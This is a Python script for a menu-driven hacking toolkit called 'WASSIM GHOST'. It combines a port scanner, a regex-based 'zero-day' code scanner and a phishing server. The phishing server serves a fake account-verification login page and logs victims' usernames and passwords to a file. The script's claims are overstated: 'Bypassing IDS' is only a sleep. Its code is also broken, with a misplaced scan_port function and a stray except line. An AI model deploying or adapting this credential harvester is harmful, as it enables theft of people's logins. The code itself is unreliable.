import socket, os, re, concurrent.futures, time, sys, base64
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import track
from pyfiglet import Figlet
from http.server import HTTPServer, BaseHTTPRequestHandler

console = Console()

class PhishListener(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = "<html><body style='text-align:center;font-family:sans-serif;padding-top:50px;'><h2>Security Verification Required</h2><form method='POST'><input name='u' placeholder='Username' required><br><br><input type='password' name='p' placeholder='Password' required><br><br><input type='submit' value='Verify Account'></form></body></html>"
        self.wfile.write(html.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Verification Failed. Try again later.")
        console.print(f"\n[bold green][!] VICTIM DATA RECEIVED: {data}[/bold green]")
        with open("log.txt", "a") as f: f.write(data + "\n")

class WassimGhostUltimate:
    def __init__(self):
        self.banner = "WASSIM GHOST"

    def clear(self): os.system('cls' if os.name == 'nt' else 'clear')

def scan_port(self, target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(2.0)
            if s.connect_ex((target, port)) == 0:
                return port
    except:
        pass
    return None

        except: return None
    def nmap_module(self):
        self.clear()
        console.print(Panel("[bold red]⚡ ADVANCED PORT DISCOVERY (MAX 10K) ⚡[/bold red]"))
        target = console.input("[?] Target IP: ")
        p_range = console.input("[?] Range (e.g. 1-1000): ")
        try:
            s_p, e_p = map(int, p_range.split('-'))
            if e_p > 10000: e_p = 10000
        except: return
        
        console.print("[yellow][*] Bypassing IDS...[/yellow]")
        time.sleep(1)
        
        ports = range(s_p, e_p + 1)
        open_p = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
            res = list(track(ex.map(lambda p: self.scan_port(target, p), ports), total=len(ports), description="Infiltrating..."))
        
        table = Table(title="SCAN RESULTS")
        table.add_column("PORT", style="green")
        table.add_column("SERVICE", style="cyan")
        for p in res:
            if p:
                open_p.append(p)
                try: srv = socket.getservbyport(p).upper()
                except: srv = "UNKNOWN"
                table.add_row(str(p), srv)
        self.clear()
        console.print(table if open_p else "[red]No open ports.[/red]")

    def vuln_scanner(self):
        self.clear()
        console.print(Panel("[bold red]🔥 ZERO-DAY VULNERABILITY AUDITOR 🔥[/bold red]"))
        path = console.input("[?] Path to scan (.): ")
        rules = {"CRITICAL: RCE Risk": r"(system|exec|eval|os\.system)\s*\(", "HIGH: SQL Injection": r"(SELECT|INSERT|DELETE).*WHERE.*=.*"}
        table = Table(title="VULN REPORT")
        table.add_column("FILE:LINE", style="cyan")
        table.add_column("TYPE", style="red")
        found = 0
        for root, _, files in os.walk(path):
            for file in files:
                if file.endswith(('.py', '.php', '.js')):
                    try:
                        with open(os.path.join(root, file), 'r') as f:
                            for i, line in enumerate(f, 1):
                                for name, pat in rules.items():
                                    if re.search(pat, line):
                                        table.add_row(f"{file}:{i}", name); found += 1
                    except: continue
        console.print(table if found else "[yellow]No vulns found.[/yellow]")

    def phish_module(self):
        self.clear()
        console.print(Panel("[bold yellow]🎣 PHISHING SERVER & LISTENER 🎣[/bold yellow]"))
        port = int(console.input("[?] Local Port (e.g. 8080): "))
        console.print(f"[green][+] Server: http://localhost:{port}[/green]")
        console.print("[cyan][*] Waiting for victim data... (Ctrl+C to stop)[/cyan]")
        try: HTTPServer(('0.0.0.0', port), PhishListener).serve_forever()
        except: pass

    def main_loop(self):
        while True:
            self.clear()
            console.print(Figlet(font='slant').renderText(self.banner), style="bold red")
            menu = Table.grid(expand=True)
            menu.add_row("[1] SCAN PORTS (10K STABLE)")
            menu.add_row("[2] VULN SCANNER (ZERO-DAY)")
            menu.add_row("[3] PHISHING SERVER")
            menu.add_row("[4] EXIT")
            console.print(Panel(menu, title="MENU", border_style="blue"))
            c = console.input("\n[Wassim-Ghost@Root]# ")
            if c == "1": self.nmap_module(); console.input("\nDone. Enter...")
            elif c == "2": self.vuln_scanner(); console.input("\nDone. Enter...")
            elif c == "3": self.phish_module()
            elif c == "4": sys.exit()

if __name__ == "__main__":
    WassimGhostUltimate().main_loop()
